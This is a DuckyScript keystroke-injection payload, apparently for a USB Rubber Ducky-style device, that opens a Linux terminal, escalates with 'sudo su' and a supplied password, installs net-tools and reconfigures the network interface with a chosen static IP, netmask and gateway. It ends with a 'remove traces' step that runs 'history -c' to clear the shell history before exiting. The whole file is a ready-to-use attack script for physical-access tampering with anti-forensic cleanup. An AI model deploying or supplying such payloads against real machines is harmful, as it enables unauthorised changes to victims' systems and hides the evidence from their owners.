REM_BLOCK
###############################################
#                                             #
# Title        : Change Network Configuration #
# Author       : Aleff                        #
# Version      : 1.0                          #
# Category     : Execution                    #
# Target       : Linux                        #
#                                             #
###############################################
END_REM

REM Requirements:
REM     - Permissions

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION
CTRL-ALT t
DELAY 2000

REM #### PERMISSIONS SECTION ####
REM Required: You need to know the sudo password and replace 'example' with this
DEFINE SUDO_PASS example
STRING sudo su
ENTER

DELAY 1000
STRING SUDO_PASS
ENTER
DELAY 1000


REM #### IP SECTION ####


REM net-tools command
STRING apt install net-tools
ENTER
DELAY 2000

REM Set network interface
DEFINE IP 192.168.1.100
DEFINE MASK 255.255.255.0
DEFINE GATEWAY 192.168.1.1

STRING IP="
STRING IP
STRING "
ENTER
DELAY 500
STRING MASK="
STRING MASK
STRING "
ENTER
DELAY 500
STRING GATEWAY="
STRING GATEWAY
STRING "
ENTER
DELAY 500

REM Get the net interface name
STRING INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5}')
ENTER
DELAY 500
STRING ifconfig $INTERFACE $IP netmask $MASK up
ENTER
DELAY 500


REM #### REMOVE TRACES ####


STRING history -c
ENTER
DELAY 500

REM Close shell
STRING exit
ENTER
